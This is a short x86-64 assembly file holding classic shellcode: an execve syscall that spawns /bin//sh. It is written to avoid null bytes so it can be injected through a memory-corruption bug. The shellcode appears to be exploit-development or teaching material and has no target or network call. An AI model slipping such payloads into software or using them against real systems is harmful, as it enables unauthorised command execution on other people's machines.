  global _start

    section .text

    _start:

    push    59   ;sys_execve
    pop rax
    xor rdi,    rdi
    push rdi
    mov rdi,    0x68732F2f6e69622F ;/bin//sh 
    push rdi
    mov rdi,    rsp ;pointer to the /bin//sh
    xor rsi,    rsi ;NULL
    xor rdx,    rdx ;NULL
    syscall
